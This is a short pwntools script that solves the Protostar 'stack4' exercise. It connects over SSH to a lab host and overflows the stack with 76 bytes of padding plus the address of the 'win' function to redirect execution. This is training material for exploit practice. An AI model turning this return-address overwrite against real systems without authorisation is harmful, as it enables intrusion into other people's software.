#!/usr/bin/env python

import time
from pwn import *

level = 4
host = "10.168.142.133"
user = "user"
chal = "stack%i" % level
password  = "user"
binary   = "/opt/protostar/bin/%s" % chal
shell = ssh(host=host, user=user, password=password)

padding = "A" * 76
addr = p32(0x80483f4) # win

payload = padding
payload += addr

r = shell.run(binary)
r.sendline(payload)
r.recvuntil("code flow successfully changed")
r.clean()

log.success("Done!")
